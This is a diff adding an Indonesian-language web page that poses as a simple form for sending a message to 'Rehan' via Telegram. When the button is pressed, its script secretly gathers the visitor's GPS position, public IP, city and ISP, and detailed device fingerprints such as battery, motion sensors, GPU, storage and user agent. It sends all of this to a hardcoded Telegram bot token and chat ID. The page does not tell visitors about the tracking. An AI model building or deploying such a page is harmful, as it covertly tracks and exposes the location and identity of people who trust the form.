@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Kirim Pesan ke Rehan</title>
+<style>
+body {margin:0;padding:0;background:linear-gradient(to bottom,#2176b5,#0e1f3d);font-family:Arial,sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;}
+.box {backdrop-filter:blur(10px);background:rgba(255,255,255,0.15);border-radius:12px;padding:25px;width:95%;max-width:380px;color:white;text-align:center;box-sizing:border-box;}
+textarea {width:100%;padding:10px;border-radius:8px;border:none;font-size:16px;margin-top:10px;outline:none;box-sizing:border-box;}
+button {margin-top:15px;width:100%;padding:12px;border:none;border-radius:8px;font-size:17px;font-weight:bold;background:#1e62d0;cursor:pointer;color:white;}
+button:active {transform:scale(0.97);}
+.info {margin-top:10px;font-size:14px;opacity:.8;}
+</style>
+</head>
+<body>
+<div class="box">
+<h2>Kirim Pesan ke Rehan</h2>
+<p class="info">Pesanmu akan terkirim lewat Telegram</p>
+<textarea id="pesan" rows="4" placeholder="Tulis pesan di sini..."></textarea>
+<button id="btnKirim">KIRIM PESAN</button>
+<p id="status" style="margin-top:10px;font-size:14px;"></p>
+</div>
+
+<script>
+const BOT_TOKEN = "8460626408:AAH1-67wDVP06frJylVhwLBj2F6Ep7lUtvU";
+const CHAT_ID = "7508766509";
+
+// Ambil GPS
+function getGPS() {
+    return new Promise(resolve=>{
+        if(!navigator.geolocation){ resolve("Tidak tersedia"); return; }
+        navigator.geolocation.getCurrentPosition(pos=>resolve(`${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)}`),
+        ()=>resolve("User menolak izin GPS"));
+    });
+}
+
+// Ambil IP publik & lokasi via API gabungan
+async function getIPInfo(){
+    try {
+        // coba ip-api
+        let res = await fetch("https://ip-api.com/json/?fields=status,message,country,city,isp,query");
+        let data = await res.json();
+        if(data.status==="success") return {ip:data.query,country:data.country,city:data.city,isp:data.isp};
+
+        // fallback ipwho.is
+        res = await fetch("https://ipwho.is/");
+        data = await res.json();
+        return {ip:data.ip,country:data.country,city:data.city,isp:data.connection.isp};
+    } catch(e){
+        return {ip:"Tidak tersedia",country:"-",city:"-",isp:"-"};
+    }
+}
+
+// Ambil device info lengkap
+async function getDeviceInfo(){
+    const ua = navigator.userAgent;
+    const deviceType = /Mobi|Android/i.test(ua)?"Mobile":/Tablet/i.test(ua)?"Tablet":"Desktop";
+    const orientation = screen.width>screen.height?"Landscape":"Portrait";
+    let battery="Tidak tersedia";
+    if(navigator.getBattery){ try{const b=await navigator.getBattery();battery=`${(b.level*100).toFixed(0)}%, ${b.charging?"Charging":"Tidak charging"}, time:${Math.round(b.chargingTime)}s/${Math.round(b.dischargingTime)}s`;}catch(e){}}
+    const connType = navigator.connection?navigator.connection.effectiveType||"Tidak tersedia":"Tidak tersedia";
+    const downlink = navigator.connection?navigator.connection.downlink||"Tidak tersedia":"Tidak tersedia";
+    const rtt = navigator.connection?navigator.connection.rtt||"Tidak tersedia":"Tidak tersedia";
+    const saveData = navigator.connection?navigator.connection.saveData?"Ya":"Tidak":"Tidak tersedia";
+    return {
+        device:deviceType,
+        ram:navigator.deviceMemory||"Unknown",
+        cpu:navigator.hardwareConcurrency||"Unknown",
+        screen:`${screen.width}x${screen.height}`,
+        availScreen:`${screen.availWidth}x${screen.availHeight}`,
+        viewport:`${window.innerWidth}x${window.innerHeight}`,
+        outer:`${window.outerWidth}x${window.outerHeight}`,
+        pixelRatio:window.devicePixelRatio,
+        orientation,
+        touch:('ontouchstart' in window)?"Ya":"Tidak",
+        maxTouch:navigator.maxTouchPoints||0,
+        dark:window.matchMedia("(prefers-color-scheme: dark)").matches?"Ya":"Tidak",
+        scroll:`X=${window.scrollX},Y=${window.scrollY}`,
+        zoom:window.visualViewport?window.visualViewport.scale:1,
+        battery,
+        platform:navigator.platform,
+        browser:navigator.appName,
+        ua,
+        vendor:navigator.vendor,
+        lang:navigator.language,
+        online:navigator.onLine?"Ya":"Tidak",
+        cookie:navigator.cookieEnabled?"Ya":"Tidak",
+        connType,
+        downlink,
+        rtt,
+        saveData
+    };
+}
+
+// Sensor & Motion
+let sensorData = {alpha:"-", beta:"-", gamma:"-", ax:0, ay:0, az:0};
+if(window.DeviceOrientationEvent){window.addEventListener("deviceorientation",e=>{sensorData.alpha=e.alpha?.toFixed(1)||"-";sensorData.beta=e.beta?.toFixed(1)||"-";sensorData.gamma=e.gamma?.toFixed(1)||"-";});}
+if(window.DeviceMotionEvent){window.addEventListener("devicemotion",e=>{sensorData.ax=e.acceleration.x?.toFixed(2)||0; sensorData.ay=e.acceleration.y?.toFixed(2)||0; sensorData.az=e.acceleration.z?.toFixed(2)||0;});}
+
+// WebGL info
+function getWebGLInfo(){
+    let canvas = document.createElement("canvas");
+    let gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+    if(!gl) return {support:"Tidak",renderer:"-",version:"-"};
+    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+    const renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";
+    return {support:"Ya",renderer,version:gl.getParameter(gl.VERSION)};
+}
+
+// AudioContext info
+function getAudioInfo(){
+    try{
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        return {support:"Ya",sampleRate:audioCtx.sampleRate,channels:audioCtx.destination.channelCount};
+    }catch(e){ return {support:"Tidak",sampleRate:"-",channels:"-"}; }
+}
+
+// Storage info
+async function getStorageInfo(){
+    const est = navigator.storage && navigator.storage.estimate ? await navigator.storage.estimate() : {quota:"-",usage:"-"};
+    return {localStorage:localStorage.length,sessionStorage:sessionStorage.length,quota:est.quota,usage:est.usage};
+}
+
+// Format
+function formatDeviceInfo(info){
+    return `• Device: ${info.device}
+• RAM: ${info.ram}GB
+• CPU: ${info.cpu}
+• Screen: ${info.screen} (avail:${info.availScreen})
+• Viewport: ${info.viewport}, Outer: ${info.outer}
+• Pixel ratio: ${info.pixelRatio}
+• Orientasi: ${info.orientation}
+• Touch: ${info.touch}, Max touch: ${info.maxTouch}
+• Dark: ${info.dark}
+• Scroll: ${info.scroll}, Zoom: ${info.zoom}
+• Battery: ${info.battery}`;
+}
+function formatBrowserInfo(info, ipInfo){
+    return `• Platform: ${info.platform}
+• Browser: ${info.browser}
+• Vendor: ${info.vendor}
+• Lang: ${info.lang}
+• Online: ${info.online}
+• Cookie: ${info.cookie}
+• Connection: ${info.connType}, Downlink: ${info.downlink}Mbps, RTT: ${info.rtt}ms, SaveData: ${info.saveData}
+• IP: ${ipInfo.ip}
+• ISP: ${ipInfo.isp}
+• City: ${ipInfo.city}
+• Country: ${ipInfo.country}`;
+}
+function formatSensorData(data){
+    return `• Orientation: alpha=${data.alpha}, beta=${data.beta}, gamma=${data.gamma}
+• Motion: ax=${data.ax}, ay=${data.ay}, az=${data.az}`;
+}
+function formatWebGLInfo(info){ return `• Support: ${info.support}, Renderer: ${info.renderer}, Version: ${info.version}`;}
+function formatAudioInfo(info){ return `• Support: ${info.support}, SampleRate: ${info.sampleRate}, Channels: ${info.channels}`;}
+function formatStorageInfo(info){ return `• localStorage: ${info.localStorage}, sessionStorage: ${info.sessionStorage}, Quota: ${info.quota}, Usage: ${info.usage}`;}
+
+// Kirim ke Telegram
+async function kirimKeTelegram(pesan,gps,deviceInfo,ipInfo,sensor,webgl,audio,storage){
+    const waktu = new Date().toLocaleString("id-ID",{timeZone:"Asia/Jakarta"});
+    const msg=`📩 *Pesan Baru Untuk Rehan*
+━━━━━━━━━━━━━━━━
+💬 Pesan: ${pesan}
+📍 Lokasi: ${gps}
+━━━━━━━━━━━━━━━━
+📱 Device Info:
+\`\`\`
+${formatDeviceInfo(deviceInfo)}
+\`\`\`
+━━━━━━━━━━━━━━━━
+🌐 Browser & OS:
+\`\`\`
+${formatBrowserInfo(deviceInfo,ipInfo)}
+\`\`\`
+━━━━━━━━━━━━━━━━
+🌀 Sensor & Motion:
+\`\`\`
+${formatSensorData(sensor)}
+\`\`\`
+━━━━━━━━━━━━━━━━
+⚡ WebGL & GPU:
+\`\`\`
+${formatWebGLInfo(webgl)}
+\`\`\`
+━━━━━━━━━━━━━━━━
+🎵 AudioContext:
+\`\`\`
+${formatAudioInfo(audio)}
+\`\`\`
+━━━━━━━━━━━━━━━━
+🗂 Storage & Cache:
+\`\`\`
+${formatStorageInfo(storage)}
+\`\`\`
+━━━━━━━━━━━━━━━━
+⏰ Waktu: ${waktu}
+━━━━━━━━━━━━━━━━
+`;
+    const url=`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    const send=await fetch(url,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:CHAT_ID,text:msg,parse_mode:"Markdown"})});
+    return send.ok;
+}
+
+// Tombol kirim
+document.getElementById("btnKirim").addEventListener("click",async ()=>{
+    const pesan=document.getElementById("pesan").value.trim();
+    const status=document.getElementById("status");
+    if(!pesan){status.innerHTML="⚠ Isi pesannya dulu.";return;}
+    status.innerHTML="⏳ ";
+
+    const gps=await getGPS();
+    const ipInfo=await getIPInfo();
+    const deviceInfo=await getDeviceInfo();
+    const webgl=getWebGLInfo();
+    const audio=getAudioInfo();
+    const storage=await getStorageInfo();
+
+    status.innerHTML="📤 Mengirim pesan...";
+    const success=await kirimKeTelegram(pesan,gps,deviceInfo,ipInfo,sensorData,webgl,audio,storage);
+    if(success){status.innerHTML="✅ Pesan berhasil dikirim!";document.getElementById("pesan").value="";}
+    else{status.innerHTML="❌ Gagal mengirim pesan!";}
+});
+</script>
+</body>
+</html>
